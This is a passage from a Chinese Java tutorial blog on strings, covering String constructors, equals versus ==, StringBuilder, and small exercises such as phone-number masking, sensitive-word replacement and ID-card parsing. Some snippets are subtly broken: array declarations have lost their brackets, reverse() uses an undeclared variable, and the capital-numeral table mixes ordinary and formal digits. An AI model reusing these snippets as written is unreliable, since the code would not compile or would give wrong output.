</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.next();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为字符串&quot;</span> + s);<span class="comment">//此时123是字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为整数：&quot;</span> + i);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为字符串&quot;</span> + s);<span class="comment">//此时123是字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Integer.parseInt(s);<span class="comment">//想要整数再进行转换</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为整数：&quot;</span> + i);</span><br></pre></td></tr></table></figure>
<h2 id="Day10-字符串"><a class="header-anchor" href="#Day10-字符串">¶</a>Day10 字符串</h2>
<h3 id="API"><a class="header-anchor" href="#API">¶</a>API</h3>
<h4 id="概念-v4"><a class="header-anchor" href="#概念-v4">¶</a>概念</h4>
<ul>
<li>API (Application Programming Interface) ：应⽤程序编程接⼝</li>
</ul>
<h4 id="Java中的API"><a class="header-anchor" href="#Java中的API">¶</a>Java中的API</h4>
<ul>
<li>
<p>指的就是 JDK 中提供的各种功能的<strong>Java类</strong>，这些类将底层的实现封装了起来</p>
</li>
<li>
<p>不需要关⼼这些类是如何实现的，只需要学习这些类<strong>如何使⽤</strong>即可，我们可以通过帮助⽂档来学习这些API如何使⽤</p>
</li>
<li>
<p>在API帮助文档中查找包、类、类在哪个包下、类的构造方法、类的成员方法</p>
</li>
</ul>
<h3 id="String类"><a class="header-anchor" href="#String类">¶</a>String类</h3>
<h4 id="概述"><a class="header-anchor" href="#概述">¶</a>概述</h4>
<ul>
<li>String 类代表字符串，Java 程序中的所有字符串⽂字（例如“abc”）都被实现为此类的实例</li>
<li>也就是说，Java 程序中所有的双引号字符串，都是 String 类的对象</li>
<li>String 类在 java.lang 包下，所以使⽤的时候不需要导包</li>
</ul>
<h4 id="特点"><a class="header-anchor" href="#特点">¶</a>特点</h4>
<ul>
<li><strong>字符串不可变</strong>，它们的值在创建后不能被更改</li>
<li>虽然 String 的值是不可变的，但是它们<strong>可以被共享</strong></li>
<li>字符串效果上相当于字符数组( char[] )，但是<strong>底层原理是字节数组( byte[] )</strong></li>
</ul>
<h4 id="构造方法-v2"><a class="header-anchor" href="#构造方法-v2">¶</a>构造方法</h4>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>public String()</td>
<td>创建一个空白字符串对象，不含有任何内容</td>
</tr>
<tr>
<td>public String(char[] chs)</td>
<td>根据字符数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td>public String(byte[] bys)</td>
<td>根据字节数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td>String s = “abc”;</td>
<td>直接赋值的方式创建字符串，内容就是abc</td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//public String()：创建⼀个空⽩字符串对象，不含有任何内容</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//public String(char[] chs)：根据字符数组的内容，来创建字符串对象</span></span><br><span class="line">charchs = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public String(byte[] bys)：根据字节数组的内容，来创建字符串对象</span></span><br><span class="line">bytebys = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bys);</span><br><span class="line"></span><br><span class="line"><span class="comment">//String s = “abc”; 直接赋值的⽅式创建字符串对象，内容就是abc</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="创建字符串对象两种方式的区别"><a class="header-anchor" href="#创建字符串对象两种方式的区别">¶</a>创建字符串对象两种方式的区别</h4>
<ul>
<li>通过构造方法创建
<ul>
<li>通过 new 创建的字符串对象，每⼀次 new 都会申请⼀个内存空间，虽然<strong>内容相同</strong>，但是<strong>地址值不同</strong></li>
</ul>
</li>
<li>直接赋值方式创建
<ul>
<li>以“”⽅式给出的字符串，只要<strong>字符序列相同</strong>(顺序和⼤⼩写)，⽆论在程序代码中出现⼏次，JVM 都<strong>只会建⽴⼀个 String 对象</strong>，并<strong>在字符串池中维护</strong></li>
</ul>
</li>
</ul>
<h4 id="字符串的比较"><a class="header-anchor" href="#字符串的比较">¶</a>字符串的比较</h4>
<h5 id="号的作用"><a class="header-anchor" href="#号的作用">¶</a>==号的作用</h5>
<ul>
<li>⽐较基本数据类型：⽐较的是<strong>具体的值</strong></li>
<li>⽐较引⽤数据类型：⽐较的是<strong>对象地址值</strong></li>
</ul>
<h5 id="euqals方法的使用"><a class="header-anchor" href="#euqals方法的使用">¶</a>euqals方法的使用</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造⽅法的⽅式得到对象</span></span><br><span class="line">charchs = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接赋值的⽅式得到对象</span></span><br><span class="line"><span class="comment">// 其实地址是一样的吧</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ⽐较字符串对象地址是否相同</span></span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br><span class="line">System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ⽐较字符串内容是否相同</span></span><br><span class="line">System.out.println(s1.equals(s2));</span><br><span class="line">System.out.println(s1.equals(s3));</span><br><span class="line">System.out.println(s3.equals(s4));</span><br></pre></td></tr></table></figure>
<ul>
<li>应用：用户登录案例
<ul>
<li><code>if (username.equals(rightUsername) &amp;&amp; password.equals(rightPassword))</code></li>
</ul>
</li>
</ul>
<h4 id="案例：遍历字符串案例"><a class="header-anchor" href="#案例：遍历字符串案例">¶</a>案例：遍历字符串案例</h4>
<ul>
<li>键盘录入一个字符串，使用程序实现在控制台遍历该字符串</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有两个方法：</span></span><br><span class="line"><span class="comment">// charAt()：会根据索引获取对应的字符</span></span><br><span class="line"><span class="comment">// length(): 会返回字符串的⻓度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">	<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> str.charAt(i);</span><br><span class="line">    System.out.println(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：反转字符串"><a class="header-anchor" href="#案例：反转字符串">¶</a>案例：反转字符串</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> reverse(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">reverse</span><span class="params">(String str)</span>&#123;<span class="comment">//abc</span></span><br><span class="line"><span class="comment">// 核⼼思想：倒着遍历并进⾏拼接就可以了</span></span><br><span class="line"><span class="comment">// fori :正着遍历 forr：倒着遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> str.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) </span><br><span class="line">    <span class="comment">// i 依次表⽰字符串⾥⾯的每⼀个索引（倒着的）</span></span><br><span class="line">    <span class="comment">// 我们就可以拿到⾥⾯的每⼀个字符并拼接</span></span><br><span class="line">    s = s + str.charAt(i);</span><br><span class="line"><span class="keyword">return</span> s;</span><br></pre></td></tr></table></figure>
<h4 id="案例：金额转换"><a class="header-anchor" href="#案例：金额转换">¶</a>案例：金额转换</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.键盘录入一个金额</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">int</span> money;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请录入一个金额&quot;</span>);</span><br><span class="line">        money = sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (money &gt;= <span class="number">0</span> &amp;&amp; money &lt;= <span class="number">9999999</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;金额无效&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义一个变量用来表示钱的大写</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">moneyStr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.得到money里面的每一位数字，再转换成中文</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 2135</span></span><br><span class="line">        <span class="comment">// 从右往左获取数据，因为右侧是数据的个位</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ge</span> <span class="operator">=</span> money % <span class="number">10</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">capitalNumber</span> <span class="operator">=</span> getCapitalNumber(ge);</span><br><span class="line">        <span class="comment">// 把转换之后的大写拼接到moneyStr当中</span></span><br><span class="line">        moneyStr = capitalNumber + moneyStr;</span><br><span class="line">        <span class="comment">// 第一次循环：“伍” + &quot;&quot; = “伍”</span></span><br><span class="line">        <span class="comment">// 第二次循环：“叁” + “伍” = “叁伍”</span></span><br><span class="line">        <span class="comment">// 去掉刚才获取的数据</span></span><br><span class="line">        money = money / <span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果数字上的每一位全部获取到了，那么money记录为0，循环停止</span></span><br><span class="line">        <span class="keyword">if</span> (money == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在前面补0.补齐7位</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">7</span> - moneyStr.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i ++) &#123;</span><br><span class="line">        moneyStr = <span class="string">&quot;零&quot;</span> + moneyStr;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(moneyStr);  <span class="comment">// 零零零叁壹叁伍</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 插入单位</span></span><br><span class="line">    <span class="comment">// 定义一个数组表示单位</span></span><br><span class="line">    String[] arr = &#123;<span class="string">&quot;佰&quot;</span>, <span class="string">&quot;拾&quot;</span>, <span class="string">&quot;万&quot;</span>, <span class="string">&quot;仟&quot;</span>, <span class="string">&quot;佰&quot;</span>, <span class="string">&quot;拾&quot;</span>, <span class="string">&quot;元&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 				零	零	零 	叁		壹	叁	伍</span></span><br><span class="line">    <span class="comment">// 遍历moneyStr， 依次得到零	零	零 	叁		壹	叁	伍</span></span><br><span class="line">    <span class="comment">// 然后把arr的单位插入进去</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; moneyStr.length(); i ++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> moneyStr.charAt(i);</span><br><span class="line">        <span class="comment">// 把大写数字和单位拼接到result中</span></span><br><span class="line">        result = result + c + arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印最终结果 </span></span><br><span class="line">    System.out.println(result);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 定义一个方法把数字变成大写的中文</span></span><br><span class="line">    <span class="comment">// 1 -- 壹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCapitalNumber</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义数组，让数字跟大写的中文产生一个对应关系</span></span><br><span class="line">        String[] arr = &#123;<span class="string">&quot;零&quot;</span>, <span class="string">&quot;一&quot;</span>, <span class="string">&quot;二&quot;</span>, <span class="string">&quot;三&quot;</span>, <span class="string">&quot;肆&quot;</span>, <span class="string">&quot;伍&quot;</span>, <span class="string">&quot;陆&quot;</span>, <span class="string">&quot;柒&quot;</span>, <span class="string">&quot;捌&quot;</span>, <span class="string">&quot;玖&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">// 返回结果</span></span><br><span class="line">        <span class="keyword">return</span> arr[number];</span><br><span class="line">    &#125;        	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：手机号屏蔽"><a class="header-anchor" href="#案例：手机号屏蔽">¶</a>案例：手机号屏蔽</h4>
<ul>
<li>
<p>需求：以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽</p>
</li>
<li>
<p>最终效果：111****1111</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test8</span>手机号屏蔽 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽</span></span><br><span class="line"><span class="comment">        最终效果为：131****9468*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.键盘录入一个手机号码</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入手机号码&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phoneNumber</span> <span class="operator">=</span> sc.next();<span class="comment">//13112349408</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.截取手机号码中的前三位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">star</span> <span class="operator">=</span> phoneNumber.substring(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.截取手机号码中的最后四位</span></span><br><span class="line">        <span class="comment">//此时我用substring方法，是用1个参数的，还是两个参数的？1个参数的会更好</span></span><br><span class="line">        <span class="comment">//因为现在我要截取到最后，所以建议使用1个参数的。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> phoneNumber.substring(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.拼接</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> star + <span class="string">&quot;****&quot;</span> + end;</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：敏感词替换"><a class="header-anchor" href="#案例：敏感词替换">¶</a>案例：敏感词替换</h4>
<ul>
<li>需求：键盘录入一个字符串，如果字符串中包含（TMD），则使用***替换</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span>敏感词替换 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个变量表示骂人的话</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">talk</span> <span class="operator">=</span> <span class="string">&quot;后裔你玩什么啊，TMD&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.把这句话中的敏感词进行替换</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> talk.replace(<span class="string">&quot;TMD&quot;</span>, <span class="string">&quot;***&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.打印</span></span><br><span class="line">        System.out.println(talk);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>扩展：需要替换的敏感词比较多怎么办</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span>多个敏感词替换 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实际开发中，敏感词会有很多很多</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.先键盘录入要说的话</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要说的话&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">talk</span> <span class="operator">=</span> sc.next();<span class="comment">//后裔你玩什么啊，TMD,GDX,ctmd,ZZ</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.定义一个数组用来存多个敏感词</span></span><br><span class="line">        String[] arr = &#123;<span class="string">&quot;TMD&quot;</span>,<span class="string">&quot;GDX&quot;</span>,<span class="string">&quot;ctmd&quot;</span>,<span class="string">&quot;ZZ&quot;</span>,<span class="string">&quot;lj&quot;</span>,<span class="string">&quot;FW&quot;</span>,<span class="string">&quot;nt&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.把说的话中所有的敏感词都替换为***</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//i 索引</span></span><br><span class="line">            <span class="comment">//arr[i] 元素 --- 敏感词</span></span><br><span class="line">            talk = talk.replace(arr[i],<span class="string">&quot;***&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.打印结果</span></span><br><span class="line">        System.out.println(talk);<span class="comment">//后裔你玩什么啊，,,,</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>也就是从单一屏蔽词匹配变成匹配词列表，对于输入语句进行遍历查找替换</li>
</ul>
<h4 id="案例：身份证信息查看"><a class="header-anchor" href="#案例：身份证信息查看">¶</a>案例：身份证信息查看</h4>
<ul>
<li>
<p>身份证的每一位都是有固定的含义：</p>
<ul>
<li>1、2位：省份</li>
<li>3、4位：城市</li>
<li>5、6位：区县</li>
<li>7-14位：出生年、月、日</li>
<li>15、16位：所在地派出所</li>
<li>17位：性别（奇数男性，偶数女性）</li>
<li>18位：个人信息码（随机产生）</li>
</ul>
</li>
<li>
<p>要求打印内容方式如下：</p>
<ul>
<li>人物信息为：</li>
<li>出生年月日：XXXX年X月X日</li>
<li>性别为：男/女</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.stringdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringDemo11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个字符串记录身份证号码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;321281202001011234&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取出生年月日</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">year</span> <span class="operator">=</span> id.substring(<span class="number">6</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">month</span> <span class="operator">=</span> id.substring(<span class="number">10</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">day</span> <span class="operator">=</span> id.substring(<span class="number">12</span>, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;人物信息为：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;出生年月日:&quot;</span> + year + <span class="string">&quot;年&quot;</span> + month + <span class="string">&quot;月&quot;</span> + day + <span class="string">&quot;日&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取性别</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">gender</span> <span class="operator">=</span> id.charAt(<span class="number">16</span>);<span class="comment">//&#x27;3&#x27;  ---&gt; 3</span></span><br><span class="line">        <span class="comment">//利用ASCII码表进行转换</span></span><br><span class="line">        <span class="comment">//&#x27;0&#x27; ---&gt;  48</span></span><br><span class="line">        <span class="comment">//&#x27;1&#x27; ---&gt;  49</span></span><br><span class="line">        <span class="comment">//&#x27;2&#x27; ---&gt;  50</span></span><br><span class="line">        <span class="comment">//&#x27;3&#x27; ---&gt;  51</span></span><br><span class="line">        <span class="comment">//&#x27;4&#x27; ---&gt;  52</span></span><br><span class="line">        <span class="comment">//&#x27;5&#x27; ---&gt;  53</span></span><br><span class="line">        <span class="comment">//&#x27;6&#x27; ---&gt;  54</span></span><br><span class="line">        <span class="comment">//&#x27;7&#x27; ---&gt;  55</span></span><br><span class="line">        <span class="comment">//&#x27;8&#x27; ---&gt;  56</span></span><br><span class="line">        <span class="comment">//&#x27;9&#x27; ---&gt;  57</span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> gender - <span class="number">48</span>;</span><br><span class="line">        <span class="keyword">if</span>(num % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别为:女&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别为:男&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="StringBuilder"><a class="header-anchor" href="#StringBuilder">¶</a>StringBuilder</h3>
<ul>
<li>可以看成是一个容器，创建之后里面的内容是可变的</li>
<li>在拼接字符串和反转字符串的时候会使用到</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本使用</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">sb.reverse();  <span class="comment">// 反转</span></span><br><span class="line"><span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sb.length();  <span class="comment">// 获取长度</span></span><br><span class="line">System.out.println(len);  <span class="comment">// 并打印</span></span><br><span class="line">System.out.println(sb);  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">因为StringBuilder是Java已经写好的类，java在底层对他做了一些特殊处理。</span></span><br><span class="line"><span class="comment">打印对象不是地址值而是属性值。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="链式编程"><a class="header-anchor" href="#链式编程">¶</a>链式编程</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 链式编程</span></span><br><span class="line"><span class="comment">// 1.创建对象</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.添加字符串</span></span><br><span class="line">sb.append(<span class="string">&quot;aaa&quot;</span>).append(<span class="string">&quot;bbb&quot;</span>).append(<span class="string">&quot;ccc&quot;</span>).append(<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">System.out.println(sb);  <span class="comment">//aaabbbcccddd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.再把StringBuilder变回字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">System.out.println(str);  <span class="comment">//aaabbbcccddd</span></span><br></pre></td></tr></table></figure>
<h4 id="练习：对称字符串"><a class="header-anchor" href="#练习：对称字符串">¶</a>练习：对称字符串</h4>
<ul>
<li>需求：键盘接受一个字符串，程序判断出该字符串是否是对称字符串，并在控制台打印是或不是</li>
<li>对称字符串：123321、111</li>
<li>非对称字符串：123123</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用StringBuilder的场景：</span></span><br><span class="line">    <span class="comment">//1.字符串的拼接</span></span><br><span class="line">    <span class="comment">//2.字符串的反转</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//1.键盘录入一个字符串</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入一个字符串&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.反转键盘录入的字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>().append(str).reverse().toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.比较</span></span><br><span class="line">        <span class="keyword">if</span>(str.equals(result))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串是对称字符串&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;当前字符串不是对称字符串&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="练习：拼接字符串"><a class="header-anchor" href="#练习：拼接字符串">¶</a>练习：拼接字符串</h4>
<ul>
<li>需求：定义一个方法，把 int 数组中的数据按照指定的格式拼接成一个字符串返回。调用该方法，并在控制台输出结果。</li>
<li>例如：数组为int[] arr = {1,2,3};
<ul>
<li>执行方法后的输出结果为：[1, 2, 3]</li>
</ul>
</li>
</ul>
